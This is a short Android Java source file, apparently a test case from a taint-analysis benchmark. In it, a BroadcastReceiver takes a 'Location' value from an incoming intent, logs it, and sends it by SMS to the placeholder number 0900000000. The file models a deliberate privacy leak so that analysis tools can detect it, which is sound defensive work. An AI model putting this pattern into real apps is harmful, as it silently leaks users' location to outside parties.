package com.test.impliciticcleak;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

public class MyBroadcastReceiver extends BroadcastReceiver
{
	public static final String ACTION = MyBroadcastReceiver.class.getPackage().getName() + ".MY_RECEIVER";
	private static final String LOG_TAG = MyBroadcastReceiver.class.getName();
	@Override
	public void onReceive(Context context, Intent intent)
	{
		Bundle bundle = intent.getExtras();
		String data = bundle.getString("Location");
		Toast.makeText(context, "Data: " + data, Toast.LENGTH_LONG).show();
		Log.d(LOG_TAG, "Receive broadcast with data " + data);
		SmsManager smsManager = SmsManager.getDefault();
		smsManager.sendTextMessage("0900000000", null, data, null, null);
		Log.d(LOG_TAG, "SMS is sucessfully sent");
	}

}
